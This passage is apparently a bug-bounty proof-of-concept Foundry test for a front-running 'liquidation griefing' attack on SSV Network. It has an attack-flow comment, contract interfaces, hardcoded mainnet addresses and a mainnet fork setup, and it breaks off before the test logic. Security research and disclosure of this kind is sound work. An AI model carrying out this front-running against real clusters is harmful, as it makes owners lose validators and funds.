import "forge-std/Test.sol";

/**
 * @title SSV Network - Liquidation Griefing Attack PoC
 * @author Security Researcher
 * @notice This PoC demonstrates how an attacker can grief legitimate cluster owners
 *         by front-running their deposits and forcing them into liquidation state
 * 
 * VULNERABILITY: Cluster State Manipulation via Front-Running
 * SEVERITY: HIGH
 * BOUNTY SCOPE: SSV Network Bug Bounty (Up to $1,000,000)
 * 
 * Attack Flow:
 * 1. Victim has a cluster with validators running
 * 2. Cluster balance is getting low, victim prepares deposit transaction
 * 3. Attacker monitors mempool and sees victim's deposit tx
 * 4. Attacker front-runs with liquidate() call
 * 5. Victim's deposit tx fails because cluster is now liquidated
 * 6. Victim loses their validators and must pay gas to reactivate
 */

// Minimal interfaces for PoC
interface ISSVNetwork {
    struct Cluster {
        uint32 validatorCount;
        uint64 networkFeeIndex;
        uint64 index;
        uint256 balance;
        bool active;
    }

    function liquidate(
        address clusterOwner,
        uint64[] calldata operatorIds,
        Cluster memory cluster
    ) external;

    function deposit(
        address clusterOwner,
        uint64[] calldata operatorIds,
        uint256 amount,
        Cluster memory cluster
    ) external;

    function reactivate(
        uint64[] calldata operatorIds,
        uint256 amount,
        Cluster memory cluster
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract SSVLiquidationGriefingPoC is Test {
    // Mainnet addresses
    address constant SSV_NETWORK = 0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1;
    address constant SSV_TOKEN = 0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54;

    address attacker;
    address victim;

    ISSVNetwork ssvNetwork;
    IERC20 ssvToken;

    function setUp() public {
        // Fork mainnet at recent block
        vm.createSelectFork("https://eth.llamarpc.com", 19000000);

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        ssvNetwork = ISSVNetwork(SSV_NETWORK);
        ssvToken = IERC20(SSV_TOKEN);

        // Fund accounts
        deal(address(ssvToken), victim, 1000 ether);
        deal(address(ssvToken), attacker, 100 ether);
    }

    function testLiquidationGriefingAttack() public {
        console.log("=== SSV Network Liquidation Griefing Attack ===");
        console.log("");

        // Setup: Victim's cluster with low balance (simulated state)
        uint64[] memory operatorIds = new uint64[](4);
